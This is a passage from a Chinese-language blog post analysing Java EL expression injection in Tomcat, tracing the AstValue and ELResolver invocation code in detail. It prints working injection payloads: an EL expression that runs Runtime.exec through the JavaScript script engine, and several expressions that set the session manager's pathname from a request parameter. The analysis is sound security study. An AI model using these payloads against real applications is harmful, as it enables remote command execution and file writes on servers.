context.notifyAfterEvaluation(getExpressionString());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 6) 返回最终结果（可能已被类型转换） ——</span></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里具体调用的是哪个 <code>getValue</code> 方法取决于 <code>ValueExpressionImpl#node</code> 的类型（也就是 AST 语法树根节点的类型）。<code>node</code> 属性的类型是 <code>org.apache.el.parser.Node</code> 是一个接口，有多种实现。</p>
<h4 id=""><a href="#" class="headerlink" title=""></a><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/02/Java%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/images/SimpleNode.png"
                      alt="SimpleNode"
                ></h4><p>我们常见的类型是<strong>方法调用</strong>（<code>AstValue</code>）和<strong>属性访问</strong>（<code>AstAssign</code>）两种。</p>
<h3 id="方法调用（AstValue）"><a href="#方法调用（AstValue）" class="headerlink" title="方法调用（AstValue）"></a>方法调用（AstValue）</h3><p>当表达式中有多个方法连续调用的操作的时候 <code>node</code> 属性是 <code>AstValue</code> 类型：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div>

<p>此时 EL 表达式解析时有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PageContextImpl.proprietaryEvaluate</span><br><span class="line"> └─ ExpressionFactory.createValueExpression(ELContext, expr, expectedType)</span><br><span class="line"> │   └─ 解析 expr → 语法树(AST)</span><br><span class="line"> │   └─ 返回 ValueExpressionImpl(node=AST根, fnMapper/varMapper/expectedType)</span><br><span class="line"> └─ ValueExpressionImpl.getValue(ELContext)</span><br><span class="line">    └─ node.getValue(EvaluationContext)</span><br><span class="line">       └─ AstCompositeExpression / AstDynamicExpression / AstValue.getValue(...)</span><br><span class="line">          ├─ 逐个“后缀”分派：属性访问 → resolver.getValue()</span><br><span class="line">          └─ 或方法调用       → resolver.invoke() → 反射 Method.invoke()</span><br></pre></td></tr></table></figure></div>

<h4 id="AstValue-getValue"><a href="#AstValue-getValue" class="headerlink" title="AstValue#getValue"></a>AstValue#getValue</h4><p>循环反射，<code>base</code> 为每轮递归反射之后保存的对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逐步求值类似 a.b.c() 这样的 EL 链式表达式：</span></span><br><span class="line"><span class="comment"> * - children[0]        ：链首（base），例如 a</span></span><br><span class="line"><span class="comment"> * - children[1]        ：后缀（suffix）①，可能是属性名 b 或方法名 b</span></span><br><span class="line"><span class="comment"> * - children[2]（可选）：若是方法调用，紧跟一个 AstMethodParameters（参数列表）</span></span><br><span class="line"><span class="comment"> * - ...</span></span><br><span class="line"><span class="comment"> * 解析过程：从左到右，遇到“方法名 + 参数列表”则走方法调用；否则走属性读取。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">(EvaluationContext ctx)</span> <span class="keyword">throws</span> ELException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 先求出链首对象 base（如表达式 a.b.c() 中的 a）</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">base</span> <span class="operator">=</span> <span class="built_in">this</span>.children[<span class="number">0</span>].getValue(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 子节点总数（包括属性名 / 方法名 / 参数列表等）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">propCount</span> <span class="operator">=</span> <span class="built_in">this</span>.jjtGetNumChildren();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 从第 1 个“后缀”节点开始处理（第 0 个是 base）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 当前处理的“后缀”标识（可能是属性名、方法名、或索引等）</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">suffix</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 统一的解析器入口：属性访问 getValue / 方法调用 invoke 都走 ELResolver</span></span><br><span class="line">    <span class="type">ELResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> ctx.getELResolver();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ====================== 主循环：沿着表达式从左往右推进 ======================</span></span><br><span class="line">    <span class="keyword">while</span> (base != <span class="literal">null</span> &amp;&amp; i &lt; propCount) &#123;</span><br><span class="line">        <span class="comment">// 6) 取当前后缀节点的值（一般是属性名/方法名字符串，或集合索引等）</span></span><br><span class="line">        suffix = <span class="built_in">this</span>.children[i].getValue(ctx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7) 判断“这是方法调用吗？”</span></span><br><span class="line">        <span class="comment">//    条件：后面还有节点，且下一个节点是参数列表 AstMethodParameters</span></span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span> &lt; propCount &amp;&amp;</span><br><span class="line">                (<span class="built_in">this</span>.children[i+<span class="number">1</span>] <span class="keyword">instanceof</span> AstMethodParameters)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 7.1 取出紧随其后的参数列表节点</span></span><br><span class="line">            <span class="type">AstMethodParameters</span> <span class="variable">mps</span> <span class="operator">=</span></span><br><span class="line">                (AstMethodParameters) <span class="built_in">this</span>.children[i+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 7.2 特殊规则：当 base 是 Optional 且调用 orElseGet(...)，</span></span><br><span class="line">            <span class="comment">//     EL 规范要求参数必须是 Lambda。若不是 Lambda，则抛出语义错误。</span></span><br><span class="line">            <span class="keyword">if</span> (base <span class="keyword">instanceof</span> Optional &amp;&amp; <span class="string">&quot;orElseGet&quot;</span>.equals(suffix) &amp;&amp;</span><br><span class="line">                    mps.jjtGetNumChildren() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">paramFoOptional</span> <span class="operator">=</span> mps.jjtGetChild(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (!(paramFoOptional <span class="keyword">instanceof</span> AstLambdaExpression ||</span><br><span class="line">                        paramFoOptional <span class="keyword">instanceof</span> LambdaExpression)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ELException</span>(MessageFactory.get(</span><br><span class="line">                            <span class="string">&quot;stream.optional.paramNotLambda&quot;</span>, suffix));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 7.3 方法调用分支：</span></span><br><span class="line">            <span class="comment">//     - 先把参数列表逐个求值为 Object[]（运行时实参）</span></span><br><span class="line">            Object[] paramValues = mps.getParameters(ctx);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//     - 通过 ELResolver.invoke(...) 调用 base.suffix(...)</span></span><br><span class="line">            <span class="comment">//       第四个参数是形参“类型数组”（由实参值推断），用于方法重载解析</span></span><br><span class="line">            base = resolver.invoke(ctx,            <span class="comment">// 解析上下文</span></span><br><span class="line">                                   base,          <span class="comment">// 目标对象</span></span><br><span class="line">                                   suffix,        <span class="comment">// 方法名（通常是 String）</span></span><br><span class="line">                                   getTypesFromValues(paramValues), <span class="comment">// 形参类型</span></span><br><span class="line">                                   paramValues);  <span class="comment">// 实参值</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 7.4 跳过“方法名节点 + 参数列表节点”这两个位置</span></span><br><span class="line">            i += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 8) 属性访问分支（非方法调用）</span></span><br><span class="line">            <span class="comment">//    例如 base = resolver.getValue(ctx, base, &quot;prop&quot;)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 8.1 若后缀为 null，根据 EL 语义直接返回 null（链到此终止）</span></span><br><span class="line">            <span class="keyword">if</span> (suffix == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 8.2 在取属性前，把“已解析”标志清零，允许后续 ELResolver 抢先处理</span></span><br><span class="line">            <span class="comment">//     —— 每次属性解析前都要 reset，具体哪个 resolver 成功解析会再把它置回 true</span></span><br><span class="line">            ctx.setPropertyResolved(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 8.3 通过 ELResolver 读取属性值（可能触发 BeanELResolver、MapELResolver、ArrayELResolver 等）</span></span><br><span class="line">            base = resolver.getValue(ctx, base, suffix);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 8.4 消费一个“后缀”节点（属性名），继续向右推进</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ====================== 循环结束后的检查 ======================</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9) 如果循环结束时，最后一次访问没有被任何 resolver 标记为“已处理”，</span></span><br><span class="line">    <span class="comment">//    说明没有合适的解析器能处理该属性/方法，抛出“未找到属性”异常。</span></span><br><span class="line">    <span class="keyword">if</span> (!ctx.isPropertyResolved()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyNotFoundException</span>(MessageFactory.get(</span><br><span class="line">                <span class="string">&quot;error.resolver.unhandled&quot;</span>, base, suffix));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10) 返回最终的求值结果（可能是属性值、方法返回值、或中间值为 null 提前结束）</span></span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="JasperELResolver-invoke"><a href="#JasperELResolver-invoke" class="headerlink" title="JasperELResolver#invoke"></a>JasperELResolver#invoke</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 尝试在 base 上调用名为 method 的方法，参数类型为 paramTypes，参数值为 params。</span></span><br><span class="line"><span class="comment"> * 具体调用由一串 ELResolver 组成的“责任链”决定：哪个 resolver 声称自己处理了，</span></span><br><span class="line"><span class="comment"> * 就以它的返回结果为准并立即结束（通过 ELContext.propertyResolved 标志协作）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(ELContext context, Object base, Object method,</span></span><br><span class="line"><span class="params">        Class&lt;?&gt;[] paramTypes, Object[] params)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 先把传入的 method 标识“规整”为字符串（常见是 DotSuffix、Identifier 等节点求值之后的对象）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">targetMethod</span> <span class="operator">=</span> coerceToString(method);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 方法名为空串 → 没有合法的方法可调用，按 EL 规范抛出 NoSuchMethodException（用 ELException 包一层）</span></span><br><span class="line">    <span class="keyword">if</span> (targetMethod.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ELException</span>(<span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 每次进入解析链前，必须把“已解析”标志复位为 false。</span></span><br><span class="line">    <span class="comment">//    责任链中的某个 resolver 如果成功处理，会把它设为 true，</span></span><br><span class="line">    <span class="comment">//    这样后面的 resolver 就不会再尝试，避免重复或冲突。</span></span><br><span class="line">    context.setPropertyResolved(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---------------- 第一段：按顺序尝试“应用自定义 + 特定支持”的 resolver ----------------</span></span><br><span class="line">    <span class="comment">// 4) 计算第一段要走到的上界 index：</span></span><br><span class="line">    <span class="comment">//    - 跳过下标 0 的 implicit resolver（隐式对象，如 pageContext、param 等，不涉及方法调用）</span></span><br><span class="line">    <span class="comment">//    - 接着尝试所有“应用注册的 resolvers”（appResolversSize 个）</span></span><br><span class="line">    <span class="comment">//    - 再尝试两个内置的特殊 resolver：stream 与 static</span></span><br><span class="line">    <span class="comment">//      （具体名称以实现为准，一般是 StreamELResolver / StaticFieldELResolver，</span></span><br><span class="line">    <span class="comment">//       前者支持流式操作，后者支持对 Class/静态成员的解析/调用）</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span> <span class="comment">/* implicit */</span> + appResolversSize +</span><br><span class="line">            <span class="number">2</span> <span class="comment">/* stream + static */</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 依次调用这段 resolver[i].invoke(...)：</span></span><br><span class="line">    <span class="comment">//    一旦有 resolver 将 context.propertyResolved 置为 true，表示“我处理了这个方法调用”，</span></span><br><span class="line">    <span class="comment">//    立刻返回它的 result。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; index; i++) &#123;</span><br><span class="line">        result = resolvers[i].invoke(</span><br><span class="line">                context, base, targetMethod, paramTypes, params);</span><br><span class="line">        <span class="keyword">if</span> (context.isPropertyResolved()) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---------------- 第二段：跳过集合类 resolvers，直接进入 Bean 及其后的 resolvers ----------------</span></span><br><span class="line">    <span class="comment">// 6) 再把 index 往后挪 4 位，以“跳过”集合相关的四个 resolver：</span></span><br><span class="line">    <span class="comment">//    MapELResolver、ResourceBundleELResolver、ListELResolver、ArrayELResolver。</span></span><br><span class="line">    <span class="comment">//    这些 resolver 主要用于“取值/设值”，通常不负责方法调用（在集合上调用方法没有语义或易歧义），</span></span><br><span class="line">    <span class="comment">//    因而这里直接略过，提高分派效率并避免误触。</span></span><br><span class="line">    index += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 从当前 index 开始到当前有效大小 size（动态值，可能通过 Atomic/ThreadLocal 保存），</span></span><br><span class="line">    <span class="comment">//    继续尝试后续 resolver —— 通常包含 BeanELResolver（支持在 Java Bean 上找方法并调用），</span></span><br><span class="line">    <span class="comment">//    以及可能追加的其它框架级 resolver。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> resolversSize.get();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> index; i &lt; size; i++) &#123;</span><br><span class="line">        result = resolvers[i].invoke(</span><br><span class="line">                context, base, targetMethod, paramTypes, params);</span><br><span class="line">        <span class="keyword">if</span> (context.isPropertyResolved()) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8) 没有任何 resolver 宣称“我处理了它” → 返回 null（EL 规范要求的“未处理”语义）。</span></span><br><span class="line">    <span class="comment">//    （上层调用者通常据此抛 PropertyNotFoundException 或继续其它路径）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="BeanELResolver-invoke"><a href="#BeanELResolver-invoke" class="headerlink" title="BeanELResolver#invoke"></a>BeanELResolver#invoke</h4><p>到具体的节点的 <code>resolver</code>，触发最终的反射</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(ELContext context, Object base, Object method,</span></span><br><span class="line"><span class="params">                     Class&lt;?&gt;[] paramTypes, Object[] params)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 保护性检查：ELContext 不能为空（否则 NPE）</span></span><br><span class="line">    Objects.requireNonNull(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) EL 语义：如果 base（调用者）或 method（方法标识）为 null，</span></span><br><span class="line">    <span class="comment">//    认为“本解析器不处理”，直接返回 null，让责任链上其它解析器有机会接手。</span></span><br><span class="line">    <span class="keyword">if</span> (base == <span class="literal">null</span> || method == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 取全局的 ExpressionFactory，用它的类型转换逻辑（EL 的强制转换规则）</span></span><br><span class="line">    <span class="type">ExpressionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> ELManager.getExpressionFactory();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 把 method 标识（可能是 Identifier、String、别的可转换对象）转换成方法名字符串</span></span><br><span class="line">    <span class="comment">//    这一步通过 EL 的 coerceToType，意味着支持诸如 number→string 的转换规则。</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> (String) factory.coerceToType(method, String.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 在 base.getClass() 上“按 EL 规则”查找最匹配的方法（重载消歧、宽化、装箱/拆箱、可变参数等）</span></span><br><span class="line">    <span class="comment">//    - context：用于取转换器、地区化信息，或在查找失败时抛合适的异常</span></span><br><span class="line">    <span class="comment">//    - base.getClass() / base：用于决定是实例方法还是静态方法（通常是实例）</span></span><br><span class="line">    <span class="comment">//    - methodName：目标方法名</span></span><br><span class="line">    <span class="comment">//    - paramTypes / params：调用者给出的期望参数类型与实参值（可能其一为 null）</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">matchingMethod</span> <span class="operator">=</span> Util.findMethod(context, base.getClass(), base,</span><br><span class="line">                                            methodName, paramTypes, params);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 根据匹配到的方法签名准备“最终实参数组”</span></span><br><span class="line">    <span class="comment">//    - 对每个 param 做 EL 强制转换，匹配 method 的参数类型</span></span><br><span class="line">    <span class="comment">//    - 若是 varargs（isVarArgs = true），把尾部参数“打包”成数组</span></span><br><span class="line">    <span class="comment">//    - 处理 null、装箱/拆箱、数值宽化（int→long）、字符串到数值/布尔的转换等</span></span><br><span class="line">    Object[] parameters =</span><br><span class="line">            Util.buildParameters(context,</span><br><span class="line">                                 matchingMethod.getParameterTypes(),</span><br><span class="line">                                 matchingMethod.isVarArgs(),</span><br><span class="line">                                 params);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 7) 通过 Java 反射调用目标方法</span></span><br><span class="line">        result = matchingMethod.invoke(base, parameters);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException | IllegalAccessException e) &#123;</span><br><span class="line">        <span class="comment">// 8) 典型反射失败（参数不匹配 / 访问不可见）：</span></span><br><span class="line">        <span class="comment">//    包装成 ELException 向上抛出，遵循 EL 的异常体系</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ELException</span>(e);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">        <span class="comment">// 9) 目标方法自身抛出的异常会被包装成 ITE，取出原始 cause</span></span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">        <span class="comment">//    Util.handleThrowable(cause) 通常会对 Error / ThreadDeath 等“致命异常”直接 rethrow，</span></span><br><span class="line">        <span class="comment">//    防止被误吞（例如 OOME、StackOverflowError）</span></span><br><span class="line">        Util.handleThrowable(cause);</span><br><span class="line">        <span class="comment">//    其它异常则包装为 ELException 抛出，供上层处理/提示</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ELException</span>(cause);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10) 成功：告知 EL 责任链“这次方法调用已被我处理”</span></span><br><span class="line">    <span class="comment">//     这里调用的是带 (base, property) 的重载，表达“谁上的哪个成员被解析/调用了”</span></span><br><span class="line">    context.setPropertyResolved(base, method);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11) 返回方法调用结果（可能为 void→null）</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="属性访问（AstAssign）"><a href="#属性访问（AstAssign）" class="headerlink" title="属性访问（AstAssign）"></a>属性访问（AstAssign）</h3><p>当我们的 EL 表达式进行的是属性访问或者属性赋值时 <code>node</code> 属性是 <code>AstAssign</code> 类型：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;</span><br></pre></td></tr></table></figure></div>

<p>此时会调用各个属性的 getter 和 setter 方法，实际上也就等价于下面这段 Java 代码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="string">&quot;a&quot;</span>));</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>pageContext.servletContext.classLoader.resources</code> 在有的 Tomcat 环境里里是 <strong>null</strong>，后面再去 <code>.context.manager.pathname</code> 会报错 <code>PropertyNotFoundException: Target Unreachable, [resources] returned null</code>。</p>
<p>这是因为在有的 Tomcat 实例里，<strong>Web 应用类加载器上的 <code>resources</code> 没被挂上（注入）</strong>，所以取出来就是 <code>null</code>。要想它不是 <code>null</code>，必须让的 WebApp 真正跑在 <strong>Tomcat 的 <code>WebappClassLoaderBase/ParallelWebappClassLoader</code> + 已初始化的 <code>StandardRoot</code></strong> 资源系统之上</p>
<p>最简做法：用“标准的 WAR 部署到独立 Tomcat”，并确保 <code>&lt;Context&gt;</code> 正常初始化了 <code>Resources</code>。</p>
<p>或者是用下面的 Payload 替代：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;applicationScope[<span class="string">&#x27;org.apache.catalina.resources&#x27;</span>].context.manager.pathname = param.a&#125;</span><br><span class="line">$&#123;applicationScope[<span class="string">&#x27;org.apache.catalina.core.StandardContext&#x27;</span>].manager.pathname = param.a&#125;</span><br><span class="line">$&#123;applicationScope[<span class="string">&#x27;org.apache.catalina.core.ApplicationContext&#x27;</span>].context.manager.pathname = param.a&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

